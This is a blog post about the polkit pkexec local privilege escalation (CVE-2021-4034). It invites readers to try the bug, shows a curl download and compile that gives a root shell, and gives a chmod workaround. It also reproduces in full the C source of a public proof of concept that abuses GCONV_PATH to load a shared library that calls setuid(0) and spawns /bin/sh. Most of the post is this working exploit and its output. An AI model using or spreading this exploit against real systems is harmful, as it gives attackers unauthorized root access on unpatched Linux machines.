---
title: "Local Privilege Escalation in polkits pkexec"
date: "2022-01-26T06:21:12-05:00"
Tags: ["vuln", "cve"]
Categories: ["security"] 
---
The big news in Linux today is the [Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)](https://seclists.org/oss-sec/2022/q1/90), with [Arstechnica](https://arstechnica.com/information-technology/2022/01/a-bug-lurking-for-12-years-gives-attackers-root-on-every-major-linux-distro/) leading with, "_A bug lurking for 12 years gives attackers root on every major Linux distro - It's likely only a matter of time before PwnKit is exploited in the wild_" Needless to say, I immediately had to try it out on my own, so I got on one of my [Debian GNU/Linux](https://debian.org) servers to test it. Spoiler: it worked, here's how you can try it too.

## Howto

```
# id
uid=1000(fak3r) gid=1000(fak3r) groups=1000(fak3r),27(sudo)
$ curl -O https://haxx.in/files/blasty-vs-pkexec.c
$ gcc blasty-vs-pkexec.c -o pkexec-poc
$ ./pkexec-poc
[~] compile helper..
[~] maybe get shell now?
# id
uid=0(root) gid=0(root) groups=0(root),27(sudo),1000(fak3r)
# 
```

## Workaround fix (temporary)

While this is bad, here's a quick workaround, remove the sticky bit from the binary - it's certainly untested, and will be null once a patch is released:

```
chmod 755 /usr/bin/pkexec
```

## Cleanup

To remove the downloaded, and generated, code:

```
rm -rf pkexec-poc blasty-vs-pkexec.c GCONV_PATH\=. lol payload.*
```

## Code

In case the C code is pulled, here's it is, again, I grabbed it from [haxx.in](https://haxx.in/files/blasty-vs-pkexec.c).

```
/*
 * blasty-vs-pkexec.c -- by blasty <peter@haxx.in> 
 * ------------------------------------------------
 * PoC for CVE-2021-4034, shout out to Qualys
 *
 * ctf quality exploit
 *
 * bla bla irresponsible disclosure
 *
 * -- blasty // 2022-01-25
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>

void fatal(char *f) {
    perror(f);
    exit(-1);
}

void compile_so() {
    FILE *f = fopen("payload.c", "wb");
    if (f == NULL) {
        fatal("fopen");
    }

    char so_code[]=
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "void gconv() {\n"
        "  return;\n"
        "}\n"
        "void gconv_init() {\n"
        "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
        "  static char *a_argv[] = { \"sh\", NULL };\n"
        "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
        "  execve(\"/bin/sh\", a_argv, a_envp);\n"
        "  exit(0);\n"
        "}\n";

    fwrite(so_code, strlen(so_code), 1, f);
    fclose(f);

    system("gcc -o payload.so -shared -fPIC payload.c");
}

int main(int argc, char *argv[]) {
    struct stat st;
    char *a_argv[]={ NULL };
    char *a_envp[]={
        "lol",
        "PATH=GCONV_PATH=.",
        "LC_MESSAGES=en_US.UTF-8",
        "XAUTHORITY=../LOL",
        NULL
    };

    printf("[~] compile helper..\n");
    compile_so();

    if (stat("GCONV_PATH=.", &st) < 0) {
        if(mkdir("GCONV_PATH=.", 0777) < 0) {
            fatal("mkdir");
        }
        int fd = open("GCONV_PATH=./lol", O_CREAT|O_RDWR, 0777); 
        if (fd < 0) {
            fatal("open");
        }
        close(fd);
    }

    if (stat("lol", &st) < 0) {
        if(mkdir("lol", 0777) < 0) {
            fatal("mkdir");
        }
        FILE *fp = fopen("lol/gconv-modules", "wb");
        if(fp == NULL) {
            fatal("fopen");
        }
        fprintf(fp, "module  UTF-8//    INTERNAL    ../payload    2\n");
        fclose(fp);
    }

    printf("[~] maybe get shell now?\n");

    execve("/usr/bin/pkexec", a_argv, a_envp);
}
```
